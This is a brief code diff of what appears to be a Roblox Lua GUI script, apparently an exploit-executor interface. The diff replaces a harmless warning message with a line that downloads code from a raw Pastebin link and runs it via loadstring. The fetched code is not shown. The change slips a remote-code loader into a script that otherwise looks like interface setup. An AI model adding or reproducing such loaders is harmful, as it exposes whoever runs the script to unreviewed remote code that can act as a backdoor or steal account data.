@@ -1,5 +1,5 @@
 repeat wait( ) until game:IsLoaded( )
-warn("Fell loves you all <33")
+loadstring(game:HttpGet("https://pastebin.com/raw/4EeaQ34E"))()
 local idk = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
